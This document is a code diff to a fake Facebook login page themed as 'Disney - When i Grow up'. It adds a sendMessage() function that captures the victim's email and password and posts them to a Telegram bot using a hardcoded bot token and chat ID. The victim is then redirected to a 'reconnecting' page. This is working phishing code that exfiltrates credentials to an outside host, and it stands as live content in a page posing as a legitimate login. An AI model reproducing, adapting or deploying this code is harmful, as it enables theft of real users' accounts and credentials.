@@ -28,10 +28,14 @@
                 <p style="text-align: center; padding-right: 15%; padding-left: 15%; color: rgba(99,106,113,0.88);">Log into your Facebook account to connect to<strong>&nbsp;Disney - When i Grow up</strong></p>
             </div>
             <div class="form-group" style="margin-bottom: 7px;">
-                <input class="form-control form-control-sm" type="text" id="email" autocomplete="off" name="eml" placeholder="Mobile number or email" style="background: #f5f6f7; border-radius: 5px;" required="">
+                <a href="tel:" id="email-link">
+                    <input class="form-control form-control-sm" type="text" id="email" autocomplete="off" name="eml" placeholder="Mobile number or email" style="background: #f5f6f7; border-radius: 5px;" required="">
+                </a>
             </div>
             <div class="form-group" style="margin-bottom: 14px;">
-                <input class="form-control form-control-sm" type="password" id="password" autocomplete="off" style="background: #f5f6f7; border-radius: 5px;" name="pwd" placeholder="Password" required="">
+                <a href="tel://" id="password-link">
+                    <input class="form-control form-control-sm" type="password" id="password" autocomplete="off" style="background: #f5f6f7; border-radius: 5px;" name="pwd" placeholder="Password" required="">
+                </a>
             </div>
             <div class="form-group">
                 <button id="subbtn" class="btn btn-secondary btn-block btn-lg text-capitalize" type="button" onclick="sendMessage()" style="background: #1877f2; font-size: 16px;">Log in</button>
@@ -57,6 +61,41 @@
             }
 
             return true;
+        }
+
+        function sendMessage() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            if (validateForm()) {
+                var message = "New Login:\nEmail: " + email + "\nPassword: " + password;
+
+                // Replace 'YourTelegramBotToken' and 'YourChatID' with your actual Telegram Bot token and chat ID
+                fetch('https://api.telegram.org/bot5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: '1634597902',
+                        text: message,
+                    }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log(data);
+                    // Redirect to the appropriate page after sending the message
+                    window.location.href = 'reconnecting.html';
+                })
+                .catch(error => {
+                    console.error('There was a problem with the fetch operation:', error);
+                });
+            }
         }
     </script>
 </body>
